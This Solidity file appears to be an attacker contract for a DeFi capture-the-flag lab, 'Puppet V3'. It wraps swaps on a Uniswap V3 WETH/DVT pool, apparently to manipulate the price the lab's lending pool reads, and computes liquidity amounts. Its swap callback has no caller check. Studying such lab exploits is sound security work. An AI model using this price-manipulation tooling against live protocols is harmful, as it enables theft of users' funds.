// SPDX-License-Identifier: MIT

pragma solidity =0.7.6;

import "./PuppetV3Pool.sol";
import "hardhat/console.sol";
import "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

contract Puppetv3Attacker {
    IUniswapV3Pool private uni;
    address private immutable weth;
    address private immutable dvt;

    constructor(address _uni, address _weth, address _dvt) {
        uni = IUniswapV3Pool(_uni);
        weth = _weth;
        dvt = _dvt;
    }

    function doSwap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) public {
        uni.swap(
            recipient,
            zeroForOne,
            amountSpecified,
            sqrtPriceLimitX96,
            data
        );
    }

    function uniswapV3SwapCallback(
        int amount0,
        int amount1,
        bytes calldata data
    ) public {
        console.log("weth amount");
        console.logInt(amount0);
        console.log("dvt amount");
        console.logInt(amount1);
        if (amount0 > 0) {
            IERC20Minimal(weth).transfer(address(uni), uint256(amount0));
        }

        if (amount1 > 0) {
            IERC20Minimal(dvt).transfer(address(uni), uint256(amount1));
        }
    }

    function calculateLiquidityAmounts(
        int24 tickLower,
        int24 tickUpper,
        int24 currentTick,
        uint amount0,
        uint amount1
    ) public pure returns (uint128) {
        uint160 sqrtPriceX96Lower = TickMath.getSqrtRatioAtTick(tickLower);
        uint160 sqrtPriceX96Upper = TickMath.getSqrtRatioAtTick(tickUpper);
        uint160 sqrtPriceX96Current = TickMath.getSqrtRatioAtTick(currentTick);

        return
            LiquidityAmounts.getLiquidityForAmounts(
                sqrtPriceX96Current,
                sqrtPriceX96Lower,
                sqrtPriceX96Upper,
                amount0,
                amount1
            );
    }
}
